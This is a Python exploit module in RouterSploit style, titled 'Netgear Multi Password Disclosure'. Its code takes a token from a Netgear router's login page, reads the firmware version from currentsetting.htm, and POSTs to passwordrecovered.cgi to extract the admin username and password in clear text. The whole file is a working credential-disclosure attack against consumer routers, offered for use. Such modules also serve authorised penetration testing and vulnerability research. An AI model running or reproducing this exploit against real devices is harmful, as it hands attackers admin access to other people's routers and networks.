# rsf exploit module
# title: Netgear Multi Password Disclosure
# description: Exploits password disclosure in multiple Netgear devices.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            try:
                response = self.session.get(f"http://{self.target}:{self.port}/", timeout=5)
                if response is not None:
                    model = response.headers.get('WWW-Authenticate', '')[13:-1]
                    token = self.extract_token(response.text) or "routersploit"
                    
                    print(f"[*] Token found: {token}" if token != "routersploit" else "[*] Token not found")
                    
                    fw_version = ""
                    try:
                        fw_resp = self.session.get(f"http://{self.target}:{self.port}/currentsetting.htm", timeout=5)
                        if fw_resp.status_code == 200:
                            fw_version = self.scrape(fw_resp.text, 'Firmware=', 'RegionTag').strip('\r\n')
                    except:
                        pass
                    
                    print(f"[*] Detected model: {model} (FW: {fw_version})")

                    path = f"/passwordrecovered.cgi?id={token}"
                    try:
                        cred_resp = self.session.post(f"http://{self.target}:{self.port}{path}", timeout=5)
                        if 'left">' in cred_resp.text:
                            username, password = self.extract_password(cred_resp.text)
                            print(f"[+] Exploit success! login: {username}, password: {password}")
                        else:
                            print("[-] Exploit failed. Could not extract credentials.")
                    except:
                        print("[-] Exploit failed")
            except:
                print("[-] Exploit failed")
        else:
            print("[-] Target is not vulnerable")

    @staticmethod
    def scrape(text, start_trig, end_trig):
        if start_trig in text:
            return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
        return False

    @staticmethod
    def extract_token(html):
        return Exploit.scrape(html, 'unauth.cgi?id=', '"')

    @staticmethod
    def extract_password(html):
        username = Exploit.scrape(html, 'Router Admin Username</td>', '</td>')
        if username:
            username = Exploit.scrape(repr(username), '>', "'")
        
        password = Exploit.scrape(html, 'Router Admin Password</td>', '</td>')
        if password:
            password = Exploit.scrape(repr(password), '>', "'")
        
        if not username:
            username = Exploit.scrape(html[html.find('left">'):], 'left">', '</td>')
        if not password:
            password = Exploit.scrape(html[html.rfind('left">'):], 'left">', '</td>')

        if password:
            password = password.replace("&#35;", "#").replace("&#38;", "&")

        return username or "", password or ""

    def check(self):
        try:
            response = self.session.get(f"http://{self.target}:{self.port}/", timeout=5)
            if response is not None:
                header = response.headers.get('WWW-Authenticate', '')
                token = self.extract_token(response.text)
                return 'NETGEAR' in header.upper() and token is not False
        except:
            pass
        return False
